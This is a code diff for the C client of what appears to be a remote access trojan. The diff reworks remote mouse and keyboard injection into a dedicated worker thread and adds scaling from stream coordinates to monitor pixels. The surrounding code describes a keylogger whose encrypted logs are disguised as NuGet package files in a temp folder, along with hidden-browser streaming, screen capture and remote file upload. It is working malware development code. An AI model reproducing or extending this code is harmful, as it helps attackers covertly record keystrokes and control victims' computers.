@@ -83,8 +83,6 @@ static void remote_disable_screensaver(void) {
 #define KEYEVENTF_KEYUP 0x0002
 #endif
 
-typedef struct { HDESK to_restore; HDESK to_close; } input_desktop_scope_t;
-
 /* Build the keylogger logs directory path.
  * The keylogger writes to %TEMP%\\NugetPackageFiles (matching your required folder name).
  * Log files use random NuGet-style .nupkg names; the UTC date is inside the encrypted HTML header.
@@ -469,48 +467,11 @@ static void remote_get_os_full_name(char* out_os, size_t out_os_sz) {
     _snprintf_s(out_os, out_os_sz, _TRUNCATE, "%s %d Bit", caption, bitness);
 }
 
-/* Switch current thread to the desktop that receives user input (required for mouse/keyboard injection to work). */
-static input_desktop_scope_t switch_to_input_desktop(void) {
-    remote_log("[loop] switch_to_input_desktop");
-    input_desktop_scope_t s = { NULL, NULL };
-    HDESK hInput = OpenInputDesktop(0, FALSE, DESKTOP_JOURNALPLAYBACK | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);
-    if (!hInput) {
-        remote_log("[loop] OpenInputDesktop failed (GetLastError=%lu), input may not be visible", (unsigned long)GetLastError());
-        return s;
-    }
-    s.to_close = hInput;
-    s.to_restore = GetThreadDesktop(GetCurrentThreadId());
-    if (!SetThreadDesktop(hInput)) { CloseDesktop(hInput); s.to_close = NULL; return s; }
-    return s;
-}
-
-static void restore_input_desktop(input_desktop_scope_t* s) {
-    if (s->to_restore) SetThreadDesktop(s->to_restore);
-    if (s->to_close) CloseDesktop(s->to_close);
-}
-
-/* 0=User (SendInput/mouse_event/keybd_event), 1=Kernel (interception driver). Set by DoSetRemoteControlMode. */
+/* 0=User (SendInput), 1=Kernel (Interception). Set by DoSetRemoteControlMode. */
 static volatile int g_remote_control_mode = 0;
 
-/* User/SendInput: switch thread to input desktop once when remote desktop stream starts (GetDesktop CreateNew),
-   restore when server sends DoStopRemoteDesktop (Stop button). */
-static input_desktop_scope_t g_rd_user_sendinput_desktop = { NULL, NULL };
-static volatile int g_rd_user_sendinput_desktop_holding = 0;
-
-static void rd_user_acquire_input_desktop_for_remote_desktop_start(void) {
-    if (g_rd_user_sendinput_desktop_holding) return;
-    if (g_remote_control_mode != 0) return;
-    g_rd_user_sendinput_desktop = switch_to_input_desktop();
-    if (g_rd_user_sendinput_desktop.to_close)
-        g_rd_user_sendinput_desktop_holding = 1;
-}
-
-static void rd_user_release_input_desktop_after_remote_desktop_stop(void) {
-    if (!g_rd_user_sendinput_desktop_holding) return;
-    restore_input_desktop(&g_rd_user_sendinput_desktop);
-    memset(&g_rd_user_sendinput_desktop, 0, sizeof(g_rd_user_sendinput_desktop));
-    g_rd_user_sendinput_desktop_holding = 0;
-}
+/* User-mode SendInput injection runs on a dedicated thread.
+ * Desktop switching via OpenInputDesktop/SetThreadDesktop is intentionally disabled. */
 
 static volatile long g_client_stop = 0;
 static volatile long g_request_reconnect = 0;
@@ -518,6 +479,16 @@ static volatile long g_request_reconnect = 0;
 static volatile int g_hidden_browser_streaming = 0;
 /* Throttle input-path log for mouse move to avoid spam. */
 static DWORD g_last_mouse_path_log_tick = 0;
+/* Extra throttle for scaling debug. */
+static DWORD g_last_mouse_scale_log_tick = 0;
+/* Hide other logs; keep only mouse scaling/click/wheel diagnostics. */
+static int g_mouse_debug_trace = 1;
+static int g_mouse_debug_trace_hex = 0;
+
+/* Remote desktop stream: last sent frame resolution per monitor index.
+ * Used to scale DoMouseEvent x/y (stream-space) back to real monitor pixels. */
+static volatile int g_rd_stream_w[16] = { 0 };
+static volatile int g_rd_stream_h[16] = { 0 };
 
 /* Single active upload slot (server uploading file to client). */
 typedef struct { int id; HANDLE hFile; char path[MAX_PATH]; long long fileSize; long long transferred; int active; } upload_slot_t;
@@ -612,25 +583,253 @@ static void send_set_status_file_manager(remote_transport_handle_t transport, co
     if (frame_len > 0) send_frame_locked(transport, frame, frame_len);
 }
 
-/* SendInput-based mouse injection (more reliable than mouse_event for focus-sensitive scenarios). */
-static void remote_send_mouse_sendinput(DWORD dwFlags, DWORD mouseData) {
-    INPUT in = { 0 };
-    in.type = INPUT_MOUSE;
-    in.mi.dwFlags = dwFlags;
-    in.mi.mouseData = mouseData;
-    /* For button events, dx/dy are ignored. */
-    (void)SendInput(1, &in, sizeof(INPUT));
+/* Mouse injection (user mode). */
+#ifndef MOUSEEVENTF_WHEEL
+#define MOUSEEVENTF_WHEEL 0x0800
+#endif
+#ifndef MOUSEEVENTF_VIRTUALDESK
+#define MOUSEEVENTF_VIRTUALDESK 0x4000
+#endif
+
+#ifndef DESKTOP_SWITCHDESKTOP
+#define DESKTOP_SWITCHDESKTOP 0x0100
+#endif
+
+/* Map screen pixel (all monitors) to 0..65535 for MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK. */
+static void remote_screen_to_absolute_normalized(long px, long py, LONG* out_dx, LONG* out_dy) {
+    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    if (vw <= 1) vw = 2;
+    if (vh <= 1) vh = 2;
+    *out_dx = (LONG)((px - (long)vx) * 65535LL / (long)(vw - 1));
+    *out_dy = (LONG)((py - (long)vy) * 65535LL / (long)(vh - 1));
 }
 
-/* SendInput-based keyboard injection. */
-static void remote_send_key_sendinput(BYTE vk, int key_down) {
-    INPUT in = { 0 };
-    in.type = INPUT_KEYBOARD;
-    in.ki.wVk = vk;
-    in.ki.wScan = 0;
-    in.ki.dwFlags = key_down ? KEYEVENTF_KEYDOWN : KEYEVENTF_KEYUP;
-    in.ki.dwExtraInfo = 0;
-    (void)SendInput(1, &in, sizeof(INPUT));
+typedef enum {
+    RD_WORKER_CMD_MOVE = 1,
+    RD_WORKER_CMD_CLICK,
+    RD_WORKER_CMD_WHEEL,
+    RD_WORKER_CMD_KEY,
+    RD_WORKER_CMD_STOP
+} rd_worker_cmd_type_t;
+
+typedef struct {
+    int type;
+    int px, py;
+    int left_button, is_down;
+    int wheel_delta;
+    BYTE vk;
+    int key_down;
+} rd_worker_cmd_t;
+
+static CRITICAL_SECTION g_rd_worker_mutex;
+static int g_rd_worker_cs_inited;
+static HANDLE g_rd_worker_thread;
+static HANDLE g_rd_worker_evt_cmd;
+static HANDLE g_rd_worker_evt_done;
+static HANDLE g_rd_worker_evt_ready;
+static rd_worker_cmd_t g_rd_worker_cmd;
+static volatile int g_rd_worker_attach_ok;
+
+static void remote_rd_worker_exec_click(int px, int py, int left_button, int is_down) {
+    LONG ax, ay;
+    ULONG_PTR extra = (ULONG_PTR)GetMessageExtraInfo();
+    INPUT in[2];
+
+    remote_screen_to_absolute_normalized((long)px, (long)py, &ax, &ay);
+    memset(in, 0, sizeof(in));
+    in[0].type = INPUT_MOUSE;
+    in[0].mi.dx = ax;
+    in[0].mi.dy = ay;
+    in[0].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
+    in[0].mi.dwExtraInfo = extra;
+
+    in[1].type = INPUT_MOUSE;
+    in[1].mi.dwFlags = (DWORD)(is_down
+        ? (left_button ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTDOWN)
+        : (left_button ? MOUSEEVENTF_LEFTUP : MOUSEEVENTF_RIGHTUP));
+    in[1].mi.dwExtraInfo = extra;
+
+    if (SendInput(2, in, sizeof(INPUT)) != 2) {
+        remote_log("[input] SendInput click failed (sent!=2) GetLastError=%lu px=%d py=%d",
+            (unsigned long)GetLastError(), px, py);
+        if (SetCursorPos(px, py)) {
+            DWORD fl = (DWORD)(is_down
+                ? (left_button ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTDOWN)
+                : (left_button ? MOUSEEVENTF_LEFTUP : MOUSEEVENTF_RIGHTUP));
+            mouse_event(fl, 0, 0, 0, extra);
+        }
+    }
+}
+
+static DWORD WINAPI remote_rd_worker_thread_proc(LPVOID arg) {
+    (void)arg;
+
+    /* Desktop switching intentionally removed per requirement.
+     * This keeps injection on the normal thread desktop; if clicks need focus
+     * it will behave like plain SendInput/keybd_event (no ERROR_ACCESS_DENIED from desktop APIs). */
+    g_rd_worker_attach_ok = 1;
+    remote_log("[rd-worker] injection thread ready (no desktop switch)");
+    SetEvent(g_rd_worker_evt_ready);
+
+    for (;;) {
+        rd_worker_cmd_t cmd;
+
+        if (WaitForSingleObject(g_rd_worker_evt_cmd, INFINITE) != WAIT_OBJECT_0)
+            break;
+
+        EnterCriticalSection(&g_rd_worker_mutex);
+        cmd = g_rd_worker_cmd;
+        LeaveCriticalSection(&g_rd_worker_mutex);
+
+        if (cmd.type == RD_WORKER_CMD_STOP)
+            break;
+
+        switch (cmd.type) {
+            case RD_WORKER_CMD_MOVE:
+                (void)SetCursorPos(cmd.px, cmd.py);
+                break;
+            case RD_WORKER_CMD_CLICK:
+                remote_rd_worker_exec_click(cmd.px, cmd.py, cmd.left_button, cmd.is_down);
+                break;
+            case RD_WORKER_CMD_WHEEL: {
+                ULONG_PTR ex = (ULONG_PTR)GetMessageExtraInfo();
+                INPUT in = { 0 };
+                in.type = INPUT_MOUSE;
+                in.mi.mouseData = (DWORD)cmd.wheel_delta;
+                in.mi.dwFlags = MOUSEEVENTF_WHEEL;
+                in.mi.dwExtraInfo = ex;
+                if (SendInput(1, &in, sizeof(INPUT)) != 1)
+                    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (DWORD)cmd.wheel_delta, ex);
+                break;
+            }
+            case RD_WORKER_CMD_KEY:
+                /* Match the same style used elsewhere in this client: SendInput for keyboard. */
+                {
+                    INPUT in = { 0 };
+                    in.type = INPUT_KEYBOARD;
+                    in.ki.wVk = cmd.vk;
+                    in.ki.wScan = 0;
+                    in.ki.dwFlags = cmd.key_down ? KEYEVENTF_KEYDOWN : KEYEVENTF_KEYUP;
+                    in.ki.time = 0;
+                    in.ki.dwExtraInfo = (ULONG_PTR)GetMessageExtraInfo();
+                    (void)SendInput(1, &in, sizeof(INPUT));
+                }
+                break;
+            default:
+                break;
+        }
+        SetEvent(g_rd_worker_evt_done);
+    }
+
+    g_rd_worker_attach_ok = 0;
+    remote_log("[rd-worker] stopped");
+    return 0;
+}
+
+static int remote_rd_worker_ensure_started(void) {
+    DWORD w;
+
+    if (g_rd_worker_thread) {
+        return g_rd_worker_attach_ok ? 1 : 0;
+    }
+
+    if (!g_rd_worker_cs_inited) {
+        InitializeCriticalSection(&g_rd_worker_mutex);
+        g_rd_worker_cs_inited = 1;
+    }
+    if (!g_rd_worker_evt_cmd) {
+        g_rd_worker_evt_cmd = CreateEventA(NULL, FALSE, FALSE, NULL);
+        g_rd_worker_evt_done = CreateEventA(NULL, FALSE, FALSE, NULL);
+        g_rd_worker_evt_ready = CreateEventA(NULL, TRUE, FALSE, NULL);
+        if (!g_rd_worker_evt_cmd || !g_rd_worker_evt_done || !g_rd_worker_evt_ready) {
+            remote_log("[rd-worker] CreateEvent failed");
+            return 0;
+        }
+    }
+
+    ResetEvent(g_rd_worker_evt_ready);
+    g_rd_worker_attach_ok = 0;
+    g_rd_worker_thread = CreateThread(NULL, 0, remote_rd_worker_thread_proc, NULL, 0, NULL);
+    if (!g_rd_worker_thread) {
+        remote_log("[rd-worker] CreateThread failed");
+        return 0;
+    }
+
+    w = WaitForSingleObject(g_rd_worker_evt_ready, 15000);
+    if (w != WAIT_OBJECT_0 || !g_rd_worker_attach_ok) {
+        remote_log("[rd-worker] attach failed or timeout (w=%lu ok=%d)", (unsigned long)w, g_rd_worker_attach_ok);
+        WaitForSingleObject(g_rd_worker_thread, INFINITE);
+        CloseHandle(g_rd_worker_thread);
+        g_rd_worker_thread = NULL;
+        return 0;
+    }
+    return 1;
+}
+
+static void remote_rd_worker_stop(void) {
+    HANDLE h;
+
+    if (!g_rd_worker_thread)
+        return;
+
+    memset(&g_rd_worker_cmd, 0, sizeof(g_rd_worker_cmd));
+    g_rd_worker_cmd.type = RD_WORKER_CMD_STOP;
+    SetEvent(g_rd_worker_evt_cmd);
+
+    h = g_rd_worker_thread;
+    g_rd_worker_thread = NULL;
+    WaitForSingleObject(h, INFINITE);
+    CloseHandle(h);
+}
+
+static void remote_rd_worker_submit(const rd_worker_cmd_t* c) {
+    if (!remote_rd_worker_ensure_started() || !g_rd_worker_attach_ok)
+        return;
+    EnterCriticalSection(&g_rd_worker_mutex);
+    memcpy(&g_rd_worker_cmd, c, sizeof(rd_worker_cmd_t));
+    LeaveCriticalSection(&g_rd_worker_mutex);
+    SetEvent(g_rd_worker_evt_cmd);
+    WaitForSingleObject(g_rd_worker_evt_done, INFINITE);
+}
+
+static void remote_rd_worker_submit_move(int px, int py) {
+    rd_worker_cmd_t c;
+    memset(&c, 0, sizeof(c));
+    c.type = RD_WORKER_CMD_MOVE;
+    c.px = px;
+    c.py = py;
+    remote_rd_worker_submit(&c);
+}
+
+static void remote_rd_worker_submit_click(int px, int py, int left_button, int is_down) {
+    rd_worker_cmd_t c;
+    memset(&c, 0, sizeof(c));
+    c.type = RD_WORKER_CMD_CLICK;
+    c.px = px;
+    c.py = py;
+    c.left_button = left_button;
+    c.is_down = is_down;
+    remote_rd_worker_submit(&c);
+}
+
+static void remote_rd_worker_submit_wheel(int delta) {
+    rd_worker_cmd_t c;
+    memset(&c, 0, sizeof(c));
+    c.type = RD_WORKER_CMD_WHEEL;
+    c.wheel_delta = delta;
+    remote_rd_worker_submit(&c);
+}
+
+static void remote_rd_worker_submit_key(BYTE vk, int key_down) {
+    rd_worker_cmd_t c;
+    memset(&c, 0, sizeof(c));
+    c.type = RD_WORKER_CMD_KEY;
+    c.vk = vk;
+    c.key_down = key_down;
+    remote_rd_worker_submit(&c);
 }
 
 /* Note: ping is sent only during the "ping handshake" (when not connected). */
@@ -1262,11 +1461,13 @@ void remote_client_run(void) {
                         }
                     }
                     else if (subtype == REMOTE_SUBTYPE_DoStopRemoteDesktop) {
-                        rd_user_release_input_desktop_after_remote_desktop_stop();
+                        remote_rd_worker_stop();
                     }
                     else if (subtype == REMOTE_SUBTYPE_DoMouseEvent) {
-                        remote_log("[loop] handling DoMouseEvent (body_len=%u)", (unsigned)(dispatch_len - consumed));
-                        remote_log_hex("DoMouseEvent body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
+                        if (g_mouse_debug_trace_hex) {
+                            remote_log("[loop] handling DoMouseEvent (body_len=%u)", (unsigned)(dispatch_len - consumed));
+                            remote_log_hex("DoMouseEvent body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
+                        }
                         unsigned int act = 0;
                         int is_down = 0, mx = 0, my = 0, mon = 0, evt_mode = -1;
                         if (remote_proto_decode_do_mouse_event(dispatch_buf + consumed, dispatch_len - consumed, &act, &is_down, &mx, &my, &mon, &evt_mode)) {
@@ -1278,6 +1479,7 @@ void remote_client_run(void) {
                             int mon_x = 0, mon_y = 0;
                             unsigned int mon_w = 0, mon_h = 0;
                             int px, py;
+                            int sw = 0, sh = 0;
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
                                 HWND gh = (HWND)remote_hidden_browser_get_hwnd();
                                 if (gh) {
@@ -1292,21 +1494,54 @@ void remote_client_run(void) {
                                 } else { px = mx; py = my; }
                             } else {
                                 remote_desktop_get_monitor_bounds(mon, &mon_x, &mon_y, &mon_w, &mon_h);
-                                px = mon_x + mx;
-                                py = mon_y + my;
+                                /* mx/my are in stream-space (codec resolution). Scale to real monitor bounds. */
+                                sw = (mon >= 0 && mon < (int)(sizeof(g_rd_stream_w) / sizeof(g_rd_stream_w[0]))) ? (int)g_rd_stream_w[mon] : 0;
+                                sh = (mon >= 0 && mon < (int)(sizeof(g_rd_stream_h) / sizeof(g_rd_stream_h[0]))) ? (int)g_rd_stream_h[mon] : 0;
+                                if (sw > 1 && sh > 1 && mon_w > 0 && mon_h > 0) {
+                                    /* Edge-aligned scale with rounding:
+                                       map [0..sw-1] -> [0..mon_w-1], [0..sh-1] -> [0..mon_h-1]. */
+                                    long long mx_c = mx;
+                                    long long my_c = my;
+                                    if (mx_c < 0) mx_c = 0; if (mx_c > (long long)sw - 1) mx_c = (long long)sw - 1;
+                                    if (my_c < 0) my_c = 0; if (my_c > (long long)sh - 1) my_c = (long long)sh - 1;
+
+                                    long long numx = mx_c * (long long)(mon_w - 1);
+                                    long long numy = my_c * (long long)(mon_h - 1);
+                                    long long denx = (long long)(sw - 1);
+                                    long long deny = (long long)(sh - 1);
+                                    long long sx = (numx + denx / 2) / denx;
+                                    long long sy = (numy + deny / 2) / deny;
+
+                                    if (sx < 0) sx = 0; if (sx > (long long)mon_w - 1) sx = (long long)mon_w - 1;
+                                    if (sy < 0) sy = 0; if (sy > (long long)mon_h - 1) sy = (long long)mon_h - 1;
+
+                                    px = mon_x + (int)sx;
+                                    py = mon_y + (int)sy;
+                                } else {
+                                    px = mon_x + mx;
+                                    py = mon_y + my;
+                                }
                             }
-                            remote_log("[loop] DoMouseEvent decoded: act=%u is_down=%d mx=%d my=%d mon=%d -> px=%d py=%d (mon_bounds x=%d y=%d w=%u h=%u)",
-                                act, is_down, mx, my, mon, px, py, mon_x, mon_y, mon_w, mon_h);
+                            DWORD now_ms = GetTickCount();
+                            int do_scale_log = g_mouse_debug_trace
+                                && (act != 4 || (now_ms - g_last_mouse_scale_log_tick) > 500);
+                            if (act == 4 && do_scale_log) g_last_mouse_scale_log_tick = now_ms;
+                            if (do_scale_log) {
+                                remote_log("[loop] DoMouseEvent decoded: act=%u is_down=%d mx=%d my=%d mon=%d -> px=%d py=%d (mon_bounds x=%d y=%d w=%u h=%u)",
+                                    act, is_down, mx, my, mon, px, py, mon_x, mon_y, mon_w, mon_h);
+                                if (sw > 1 && sh > 1) {
+                                    remote_log("[scale] mon=%d stream=%dx%d real=%ux%u in=(%d,%d) out=(%d,%d)",
+                                        mon, sw, sh, mon_w, mon_h, mx, my, px - mon_x, py - mon_y);
+                                }
+                            }
 
                             int effective_mode = (evt_mode >= 0) ? evt_mode : (int)g_remote_control_mode;
                             if (g_hidden_browser_streaming) effective_mode = 1;
                             {
                                 int use_kernel = (effective_mode == 1 && remote_input_interception_is_ready());
-                                DWORD now = GetTickCount();
-                                int do_log = (act != 4) || (now - g_last_mouse_path_log_tick > 2000);
-                                if (do_log) {
-                                    g_last_mouse_path_log_tick = now;
-                                    remote_log("[loop] DoMouseEvent -> input via %s", use_kernel ? "Kernel (interception driver)" : "User (SetCursorPos/mouse_event)");
+                                int do_inject_log = (act == 0 || act == 1 || act == 2 || act == 3 || act == 5 || act == 6);
+                                if (do_inject_log) {
+                                    remote_log("[loop] DoMouseEvent inject via %s (act=%u)", use_kernel ? "Kernel (interception driver)" : "User (SendInput)");
                                 }
                             }
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
@@ -1318,53 +1553,57 @@ void remote_client_run(void) {
                                 }
                             }
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
-                                /* Keep the OS cursor position in sync so focus changes normally. */
-                                (void)SetCursorPos(px, py);
+                                int vd_x = 0, vd_y = 0, vd_w = 0, vd_h = 0;
+                                remote_desktop_get_virtual_bounds(&vd_x, &vd_y, &vd_w, &vd_h);
                                 if (act == 4) {
-                                    remote_input_interception_mouse_move(px, py);
+                                    remote_input_interception_mouse_move(px, py, vd_x, vd_y, vd_w, vd_h);
                                 }
-                                else {
-                                    remote_input_interception_mouse_move(px, py);
-                                    if (act == 0 || act == 1) {
-                                        int ok = remote_input_interception_mouse_button(0, is_down);
-                                        if (ok == 0) {
-                                            remote_log("[kernel] interception click failed (sent=0); no fallback act=%u is_down=%d", act, is_down);
-                                        }
+                                else if (act == 0 || act == 1) {
+                                    remote_input_interception_mouse_move(px, py, vd_x, vd_y, vd_w, vd_h);
+                                    int ok = remote_input_interception_mouse_button(0, is_down);
+                                    if (ok == 0) {
+                                        remote_log("[kernel] interception click failed (sent=0); no fallback act=%u is_down=%d", act, is_down);
                                     }
-                                    else if (act == 2 || act == 3) {
-                                        int ok = remote_input_interception_mouse_button(1, is_down);
-                                        if (ok == 0) {
-                                            remote_log("[kernel] interception click failed (sent=0); no fallback act=%u is_down=%d", act, is_down);
-                                        }
+                                }
+                                else if (act == 2 || act == 3) {
+                                    remote_input_interception_mouse_move(px, py, vd_x, vd_y, vd_w, vd_h);
+                                    int ok = remote_input_interception_mouse_button(1, is_down);
+                                    if (ok == 0) {
+                                        remote_log("[kernel] interception click failed (sent=0); no fallback act=%u is_down=%d", act, is_down);
                                     }
-                                    else if (act == 5) {
-                                        int ok = remote_input_interception_mouse_wheel(120);
-                                        if (ok == 0) {
-                                            remote_log("[kernel] interception wheel failed (sent=0); no fallback act=%u", act);
-                                        }
+                                }
+                                else if (act == 5) {
+                                    if (g_mouse_debug_trace)
+                                        remote_log("[wheel] act=5 kernel delta=+120 px=%d py=%d mon=%d sw=%d sh=%d",
+                                            px, py, mon, sw, sh);
+                                    int ok = remote_input_interception_mouse_wheel(120);
+                                    if (ok == 0) {
+                                        remote_log("[kernel] interception wheel failed (sent=0); no fallback act=%u", act);
                                     }
-                                    else if (act == 6) {
-                                        int ok = remote_input_interception_mouse_wheel(-120);
-                                        if (ok == 0) {
-                                            remote_log("[kernel] interception wheel failed (sent=0); no fallback act=%u", act);
-                                        }
+                                }
+                                else if (act == 6) {
+                                    if (g_mouse_debug_trace)
+                                        remote_log("[wheel] act=6 kernel delta=-120 px=%d py=%d mon=%d sw=%d sh=%d",
+                                            px, py, mon, sw, sh);
+                                    int ok = remote_input_interception_mouse_wheel(-120);
+                                    if (ok == 0) {
+                                        remote_log("[kernel] interception wheel failed (sent=0); no fallback act=%u", act);
                                     }
                                 }
                             } else {
-                                /* User / SendInput mode — thread should already be on input desktop (acquired on GetDesktop CreateNew). */
+                                /* User mode: injection queued to dedicated thread (no desktop switching). */
                                 if (act == 4) {
-                                    SetCursorPos(px, py);
+                                    remote_rd_worker_submit_move(px, py);
                                 } else if (act == 5 || act == 6) {
-                                    /* Scroll: do NOT call SetCursorPos — the server sends (0,0) for scroll coords. */
-                                    remote_send_mouse_sendinput(MOUSEEVENTF_WHEEL,
-                                        act == 5 ? (DWORD)120 : (DWORD)-120);
+                                    if (g_mouse_debug_trace)
+                                        remote_log("[wheel] act=%u user delta=%d px=%d py=%d mon=%d sw=%d sh=%d",
+                                            act, act == 5 ? 120 : -120, px, py, mon, sw, sh);
+                                    remote_rd_worker_submit_wheel(act == 5 ? 120 : -120);
                                 } else {
-                                    SetCursorPos(px, py);
-                                    if (act == 0 || act == 1) {
-                                        remote_send_mouse_sendinput(is_down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP, 0);
-                                    } else if (act == 2 || act == 3) {
-                                        remote_send_mouse_sendinput(is_down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP, 0);
-                                    }
+                                    if (act == 0 || act == 1)
+                                        remote_rd_worker_submit_click(px, py, 1, is_down);
+                                    else if (act == 2 || act == 3)
+                                        remote_rd_worker_submit_click(px, py, 0, is_down);
                                 }
                             }
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
@@ -1372,8 +1611,10 @@ void remote_client_run(void) {
                                 remote_hidden_browser_release_after_input();
                             }
                         } else {
-                            remote_log("[loop] DoMouseEvent decode failed (body_len=%u)", (unsigned)(dispatch_len - consumed));
-                            remote_log_hex("DoMouseEvent body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
+                            if (g_mouse_debug_trace)
+                                remote_log("[loop] DoMouseEvent decode failed (body_len=%u)", (unsigned)(dispatch_len - consumed));
+                            if (g_mouse_debug_trace_hex)
+                                remote_log_hex("DoMouseEvent body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
                         }
                     }
                     else if (subtype == REMOTE_SUBTYPE_DoKeyboardEvent) {
@@ -1396,14 +1637,12 @@ void remote_client_run(void) {
                             remote_log("[loop] DoKeyboardEvent decoded: key=%u (0x%02X) key_down=%d mode=%d", (unsigned)key, (unsigned)key, key_down, effective_mode);
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
                                 remote_log("[loop] DoKeyboardEvent -> input via Kernel (interception driver)");
-                                /* Ensure injection targets the thread's input desktop. */
-                                input_desktop_scope_t scope = switch_to_input_desktop();
+                                /* Driver injects at a lower level; no thread input-desktop switch. */
                                 remote_input_interception_key(key, key_down);
-                                if (scope.to_close) restore_input_desktop(&scope);
                             } else {
                                 remote_log("[loop] DoKeyboardEvent -> input via User (keybd_event) [mode=%d interception_ready=%d]",
                                     effective_mode, remote_input_interception_is_ready());
-                                remote_send_key_sendinput((BYTE)key, key_down);
+                                remote_rd_worker_submit_key((BYTE)key, key_down);
                             }
                             if (g_hidden_browser_streaming && remote_hidden_browser_is_active()) {
                                 Sleep(5);
@@ -1893,11 +2132,15 @@ void remote_client_run(void) {
                                 prev_quality = quality;
                                 prev_display = display_index;
                                 if (create_new)
-                                    rd_user_acquire_input_desktop_for_remote_desktop_start();
+                                    (void)remote_rd_worker_ensure_started();
                                 unsigned int img_len = 0;
                                 int w = 0, h = 0;
                                 unsigned char* img_buf = remote_desktop_capture(display_index, quality, &img_len, &w, &h);
                                 if (img_buf && img_len >= 4) {
+                                    if (display_index >= 0 && display_index < (int)(sizeof(g_rd_stream_w) / sizeof(g_rd_stream_w[0]))) {
+                                        g_rd_stream_w[display_index] = w;
+                                        g_rd_stream_h[display_index] = h;
+                                    }
                                     unsigned int body_max = img_len + 128;
                                     unsigned char* body_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, body_max);
                                     if (body_buf) {
@@ -2167,6 +2410,7 @@ void remote_client_run(void) {
                     remote_log("[loop] payload still not IMessage after prepend? first byte=0x%02X, len=%u", dispatch_len > 0 ? dispatch_buf[0] : 0, dispatch_len);
                 }
             }
+            remote_rd_worker_stop();
             g_file_transport = NULL;
             HeapFree(GetProcessHeap(), 0, payload_buf);
         }
